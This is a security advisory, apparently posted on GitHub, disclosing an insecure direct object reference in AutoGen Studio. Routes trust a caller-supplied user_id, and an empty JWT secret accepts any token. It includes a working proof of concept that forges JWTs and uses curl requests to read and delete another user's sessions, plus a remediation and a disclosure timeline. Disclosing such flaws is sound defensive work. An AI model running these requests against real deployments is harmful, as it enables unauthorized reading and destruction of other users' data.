
https://github.com/microsoft/autogen

While Microsoft requests autogen vulnerability reports to be sent to MSRC through their security policy, MSRC advises autogen isn't production-ready and thus N/A: 
<img width="1267" height="542" alt="image" src="https://github.com/user-attachments/assets/f711e92e-3b87-4bc8-85d6-182ab9d94fe4" />

<img width="797" height="304" alt="image" src="https://github.com/user-attachments/assets/34178e70-b1fc-4b00-8771-bc4175dce48e" />


# IDOR across all AutoGen Studio routes via user-controlled `user_id` query parameter

Package: autogenstudio (PyPI)

Affected Versions: <= 0.4.2.2 (latest PyPI release); current main (0.4.3.dev)

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (8.1 High)

CWE: CWE-639 Authorization Bypass Through User-Controlled Key


### Summary

Every multi-user route in AutoGen Studio (autogenstudio) takes the resource owner as a `user_id` query parameter instead of reading the authenticated user from the request state. When AutoGen Studio is deployed with authentication enabled (`AUTOGENSTUDIO_AUTH_CONFIG=...`), any authenticated user can read, modify, or delete another user's sessions, teams, runs, gallery entries, settings, and messages by passing the victim's `user_id` in the query string. The authentication middleware verifies the JWT and stores the verified identity in `request.state.user`, but no route handler consults that state. Every handler instead trusts the `user_id` supplied by the caller.

### Details

The auth middleware at `python/packages/autogen-studio/autogenstudio/web/auth/middleware.py:50-60` authenticates the request and assigns the verified identity to `request.state.user`:

```python
user = await self.auth_manager.authenticate_request(request)
# Add user to request state for use in route handlers
request.state.user = user
return await call_next(request)
```

All resource routes ignore `request.state.user` and instead accept `user_id` as a regular query parameter. For example, `python/packages/autogen-studio/autogenstudio/web/routes/sessions.py:13-23`:

```python
@router.get("/")
async def list_sessions(user_id: str, db=Depends(get_db)) -> Dict:
    """List all sessions for a user"""
    response = db.get(Session, filters={"user_id": user_id})
    return {"status": True, "data": response.data}


@router.get("/{session_id}")
async def get_session(session_id: int, user_id: str, db=Depends(get_db)) -> Dict:
    """Get a specific session"""
    response = db.get(Session, filters={"id": session_id, "user_id": user_id})
```

The same pattern repeats throughout the route layer:

- `routes/sessions.py:14-71` (list, get, update, delete sessions, and list session runs)
- `routes/teams.py:14-49` (list, get, update, delete teams)
- `routes/gallery.py:14-65` (list, get, create, update, delete gallery entries)
- `routes/settingsroute.py:13` (get and update settings)
- `routes/runs.py:25-36` (create run for a session, with user_id taken from the JSON body)

Because the authentication middleware does not rewrite the query string or body, a token issued for `alice@example.com` is accepted with `?user_id=bob@example.com` and returns Bob's data.

A separate, related weakness exists at `auth/manager.py:80-83`:

```python
if not self.config.jwt_secret:
    # For development with no JWT secret
    logger.warning("JWT secret not configured, accepting all tokens")
    return User(id="guestuser@gmail.com", name="Default User", provider="none")
```

When authentication is configured but `jwt_secret` is empty, any bearer token is accepted as the default user, which makes a misconfigured deployment effectively unauthenticated.

### PoC

Prerequisites:

1. Run AutoGen Studio with authentication enabled. Create an `auth.yaml`. The `type` value must be one of `none`, `github`, `msal`, or `firebase`; internal token verification uses `jwt_secret` with HS256 regardless of the configured provider, so placeholder github fields are sufficient to reproduce:

```yaml
type: github
jwt_secret: "test-secret-1234567890-abcdefghij"
github:
  client_id: "dummy-client-id"
  client_secret: "dummy-client-secret"
  callback_url: "http://localhost:8081/api/auth/callback"
  scopes: ["user:email"]
exclude_paths: []
```

Launch with:

```
AUTOGENSTUDIO_AUTH_CONFIG=./auth.yaml autogenstudio ui --host 0.0.0.0 --port 8081
```

Confirm authentication is active by the log line "Initialized auth manager with provider: github". If the config fails validation, the server silently falls back to no authentication.

2. Use two users, `alice@example.com` and `bob@example.com`, where Bob has at least one session.

3. Mint JWTs signed with the configured `jwt_secret`:

```python
import jwt, time
secret = "test-secret-1234567890-abcdefghij"
exp = int(time.time()) + 3600
print("ALICE:", jwt.encode({"sub":"alice@example.com","name":"Alice","provider":"github","exp":exp}, secret, algorithm="HS256"))
print("BOB:",   jwt.encode({"sub":"bob@example.com","name":"Bob","provider":"github","exp":exp}, secret, algorithm="HS256"))
```

Call these `TOKEN_ALICE` and `TOKEN_BOB`. As a sanity check, a request with no Authorization header returns 401, and a JWT signed with the wrong secret returns 401.

Environment: autogenstudio==0.4.2.2 from PyPI, Python 3.12, auth.yaml as above, server started with `AUTOGENSTUDIO_AUTH_CONFIG=./auth.yaml autogenstudio ui --host 127.0.0.1 --port 8100`.

Step 0. Verify that unauthenticated requests are rejected:

```
curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:8100/api/sessions/
```

Output: `401`

Step 1. Bob creates a session with his own token:

```
curl -sL -X POST http://127.0.0.1:8100/api/sessions/ \
  -H "Authorization: Bearer TOKEN_BOB" \
  -H "Content-Type: application/json" \
  -d '{"user_id": "bob@example.com", "name": "Bobs private AI project", "team_id": 1}'
```

Output:
```json
{
    "message": "Session created successfully",
    "status": true,
    "data": {
        "version": "0.0.1",
        "created_at": "2026-06-13T19:39:17.673817",
        "updated_at": "2026-06-13T19:39:17.674292",
        "name": "Bobs private AI project",
        "user_id": "bob@example.com",
        "id": 1,
        "team_id": 1
    }
}
```

Step 2. Alice reads Bob's sessions using Alice's JWT but Bob's user_id (IDOR):

```
curl -sL "http://127.0.0.1:8100/api/sessions/?user_id=bob@example.com" \
  -H "Authorization: Bearer TOKEN_ALICE"
```

Output:
```json
{
    "status": true,
    "data": [
        {
            "version": "0.0.1",
            "created_at": "2026-06-13T19:39:17.673817",
            "updated_at": "2026-06-13T19:39:17.674292",
            "name": "Bobs private AI project",
            "user_id": "bob@example.com",
            "id": 1,
            "team_id": 1
        }
    ]
}
```

Step 3. Alice deletes Bob's session with Alice's JWT:

```
curl -sL -X DELETE "http://127.0.0.1:8100/api/sessions/1?user_id=bob@example.com" \
  -H "Authorization: Bearer TOKEN_ALICE"
```

Output:
```json
{"status": true, "message": "Session deleted successfully"}
```

Step 4. Bob confirms his session is gone:

```
curl -sL "http://127.0.0.1:8100/api/sessions/?user_id=bob@example.com" \
  -H "Authorization: Bearer TOKEN_BOB"
```

Output: `{"status": true, "data": []}`

The same primitive works against `/api/teams`, `/api/gallery`, `/api/settings`, and the run and message routes.

### Impact

Any authenticated user can read, modify, and delete other users' sessions, teams, gallery entries, settings, and conversation history, including uploaded prompts and model configurations. In a multi-tenant or shared deployment this is a full break of per-user isolation. The issue is present from the introduction of AutoGen Studio's authentication middleware and remains in current main.

### Remediation

Derive `user_id` from `request.state.user` inside each route, for example via a FastAPI dependency such as `Depends(get_current_user)`, rather than reading it from the query string or request body. The existing `get_current_user` dependency in `deps.py` is already wired up for this purpose. Separately, `AuthManager.authenticate_request` (`auth/manager.py:80`) should fail closed when `jwt_secret` is empty rather than returning a default user.

### Disclosure

 - 24 May 2026 - reported to MSRC https://msrc.microsoft.com/report/vulnerability/VULN-190326
 - 24 May 2026 - MSRC Case 118397 opened
 - 30 June 2026 - MSRC auto-notification advised autogen is not production-ready and closes the ticket

<img width="816" height="294" alt="image" src="https://github.com/user-attachments/assets/ee06a61d-de56-4b5f-8b22-a31902e5ace9" />

